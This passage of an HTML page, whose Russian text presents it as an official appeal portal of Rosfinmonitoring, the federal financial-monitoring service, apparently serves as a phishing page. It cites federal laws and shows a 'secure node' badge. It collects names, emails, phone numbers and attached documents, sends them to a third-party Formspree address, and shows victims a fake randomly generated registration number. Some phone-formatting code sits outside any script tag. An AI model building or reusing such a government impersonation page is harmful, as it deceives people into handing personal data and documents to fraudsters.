        .footer-emblem { height: 60px; width: auto; object-fit: contain; flex-shrink: 0; }
        .footer-disclaimer { color: #cedbe7; line-height: 1.6; text-align: justify; font-style: italic; max-width: 450px; }
        .footer-copyright { color: #8fa2b5; font-size: 11px; font-weight: bold; text-align: right; white-space: nowrap; flex-shrink: 0; }
    </style>
</head>
<body>

    <nav class="navbar-custom">
        <div class="logo-area" onclick="window.location.href='index.html'">
            <img src="emblem.png" class="emblem-img" alt="Герб">
            <div class="logo-text">
                <h1>РОСФИНМОНИТОРИНГ</h1>
                <p>Официальный модуль отправки обращений</p>
            </div>
        </div>
        <div style="font-size: 12px; font-weight: bold; color: #a0b2c6;">УЗЕЛ СВЯЗИ: ЗАЩИЩЕН</div>
    </nav>

    <div class="form-container">
        <div class="section-title">Прием обращений граждан и организаций</div>
        
        <div class="notice-box">
            <strong>Внимание!</strong> Обращения, направленные через настоящий электронный портал, регистрируются в установленном порядке в соответствии с Федеральным законом № 59-ФЗ «О порядке рассмотрения обращений граждан Российской Федерации».
        </div>

        <form action="https://formspree.io/f/mlgkaknj" method="POST" id="appealForm" onsubmit="sendForm(event)" enctype="multipart/form-data">
            
            <div class="form-group">
                <label for="fullName">ФИО заявителя / Наименование организации *</label>
                <input type="text" id="fullName" name="name" class="form-control" placeholder="Иванов Иван Иванович" required>
            </div>

            <div class="form-group">
                <label for="email">Электронная почта для ответа *</label>
                <input type="email" id="email" name="email" class="form-control" placeholder="example@mail.ru" required>
            </div>

            <div class="form-group">
    <label for="phone">Номер телефона для связи *</label>
    <!-- Убрали жесткий pattern, оставили только базовую проверку на цифры -->
    <input type="tel" id="phone" name="phone" class="form-control" placeholder="+7 (999) 123-45-67" required>
</div>

            <div class="form-group">
                <label for="subject">Тема обращения *</label>
                <select id="subject" name="subject" class="form-control" required>
                    <option value="" disabled selected>Выберите тему...</option>
                    <option value="Сообщение о сомнительных операциях">Сообщение о сомнительных операциях / антифрод</option>
                    <option value="Вопросы исполнения 115-ФЗ">Вопросы исполнения требований Федерального закона № 115-ФЗ</option>
                    <option value="Техподдержка ЛК">Запрос технической поддержки Личного Кабинета</option>
                    <option value="Жалобы и предложения">Жалобы и предложения</option>
                </select>
            </div>

            <div class="form-group">
                <label for="message">Текст обращения *</label>
                <textarea id="message" name="message" class="form-control" placeholder="Подробно изложите суть вашего вопроса или заявления..." required></textarea>
            </div>

            <div class="form-group">
                <label for="file">Прикрепить подтверждающие документы (PDF, PNG, JPG)</label>
                <input type="file" id="file" name="attachment" class="form-control" style="padding: 8px;">
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="agreement" required>
                <label for="agreement">Я подтверждаю свое согласие на обработку персональных данных Федеральной службой по финансовому мониторингу в рамках рассмотрения настоящего обращения.</label>
            </div>

            <button type="submit" class="btn-submit">Отправить официальное обращение</button>
        </form>

        <a href="index.html" class="btn-back">← Назад на главную</a>
    </div>

    <div id="successModal" class="modal-success">
        <div class="modal-content">
            <div style="font-size: 40px; margin-bottom: 15px;">✉️</div>
            <h3>Обращение успешно отправлено!</h3>
            <p>Вашему заявлению присвоен временный входящий номер:</p>
            <p style="font-family: monospace; font-size: 16px; font-weight: bold; color: #005695; background: #eef2f5; padding: 8px; margin: 15px 0; border-radius: 4px;">
                РФМ-ОБ-<span id="ticketNumber">000000</span>
            </p>
            <p>Официальный ответ будет направлен на указанный вами Email в течение установленного законом срока.</p>
            <button class="btn-close" onclick="closeModal()">Закрыть окно</button>
        </div>
    </div>

    <footer class="footer-profile">
        <div class="footer-container">
            <img src="emblem.png" class="footer-emblem" alt="Герб Росфинмониторинга">
            <div class="footer-disclaimer">
                «Поступающие обращения обрабатываются в строгом соответствии с регламентами информационной безопасности Федеральной службы».
            </div>
            <div class="footer-copyright">
                © 2001-2026 Федеральная служба<br>по финансовому мониторингу.
            </div>
        </div>
    </footer>

    <script>
        function sendForm(event) {
            event.preventDefault();
            
            const form = event.target;
            const button = form.querySelector('.btn-submit');
            
            button.innerText = "Отправка документов...";
            button.disabled = true;

            fetch(form.action, {
                method: form.method,
                body: new FormData(form),
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                if (response.ok) {
                    const randomTicket = Math.floor(100000 + Math.random() * 900000);
                    document.getElementById('ticketNumber').innerText = randomTicket;
                    document.getElementById('successModal').style.display = 'flex';
                } else {
                    alert("Ошибка сервера при отправке. Убедитесь, что размер файла не превышает лимиты.");
                }
            }).catch(error => {
                alert("Ошибка сети! Проверьте подключение к интернету.");
            }).finally(() => {
                button.innerText = "Отправить официальное обращение";
                button.disabled = false;
            });
        }

        function closeModal() {
            document.getElementById('successModal').style.display = 'none';
            document.getElementById('appealForm').reset();
        }
    </script>
document.getElementById('phone').addEventListener('blur', function() {
    // 1. Очищаем строку от пробелов, скобок, дефисов и тире
    let cleaned = this.value.replace(/[^0-9+]/g, '');
    
    // 2. Если пользователь начал с 8, меняем на +7 для солидности (по желанию)
    if (cleaned.startsWith('8')) {
        cleaned = '+7' + cleaned.substring(1);
    }
    
    // 3. Если ввели вообще без кода (например, 9261234567), дописываем +7
    if (cleaned.length === 10 && !cleaned.startsWith('+')) {
        cleaned = '+7' + cleaned;
    }

    // Возвращаем очищенный номер обратно в поле
    this.value = cleaned;
});
</body>
